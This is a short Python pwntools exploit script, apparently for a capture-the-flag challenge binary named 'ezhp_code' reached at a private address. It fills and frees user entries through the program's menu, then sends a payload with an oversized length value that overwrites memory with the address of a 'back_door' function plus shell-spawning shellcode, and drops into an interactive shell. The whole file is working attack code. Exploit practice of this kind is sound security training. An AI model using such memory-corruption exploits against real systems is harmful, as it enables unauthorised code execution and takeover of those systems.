from pwn import *
import time 
import logging
'''
logging.basicConfig(level = logging.INFO,format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
'''
context.log_level = 'DEBUG'
#p = process('./ezhp_code') 
p=remote('172.18.0.2',10000)
elf=ELF('./ezhp_code')

back_door=elf.symbols['back_door']
def add_User_gdb(user_name, lenth, content):
    p.recvuntil(b'3.exit')
    
    #gdb.attach(p,'''
    #           b check_handle
    #           continue
    #           ''')
    p.sendline(b'1')
    p.interactive()

def add_User(user_name, lenth, content):
    p.recvuntil(b'3.exit')
    p.sendline(b'1')
    p.recvuntil(b'Input your name:')
    p.sendline(user_name)
    p.recvuntil(b'The length you want to say:')
    p.sendline(str(lenth).encode())
    p.recvuntil(b'You say:')
    p.sendline(content)

def del_User():
    p.recvuntil(b'3.exit')
    p.sendline(b'2')


add_User(b'A'*0x10, 10, b'A'*0x10)
add_User(b'A'*0x10, 10, b'A'*0x10)
add_User(b'A'*0x10, 10, b'A'*0x10)

del_User()
del_User()

shellcode = asm(shellcraft.sh())
exp_lenth = 2147483650  
nop_sled = b'\x90' * 0x10
payload = b'A'*0x10 + p64(0) + p64(0xa0) + b'A'*0x28 +p64(back_door)+shellcode
add_User(b'A'*0x10, exp_lenth, payload)
add_User_gdb(b'A'*0x10, 10, b'A'*0x10)

